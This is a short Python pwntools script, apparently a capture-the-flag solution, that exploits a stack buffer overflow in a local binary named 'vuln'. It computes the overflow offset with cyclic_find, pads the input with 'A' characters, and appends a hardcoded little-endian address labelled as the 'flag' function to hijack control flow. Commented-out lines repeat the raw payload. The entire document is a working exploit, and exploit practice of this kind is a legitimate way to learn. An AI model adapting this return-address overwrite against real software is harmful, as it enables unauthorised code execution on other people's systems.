from pwn import *
import os
import subprocess


p = subprocess.Popen(['./vuln'], stdin=subprocess.PIPE)

vuln = ELF('./vuln')
num = cyclic_find(p32(0x61616174))
data = 'A'*num + '\xe6\x85\x04\x08' #p32(vuln.symbols['flag'])
p.communicate(input=data)

print data

#end = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe6\x85\x04\x08'
#print 'A'*num
#print end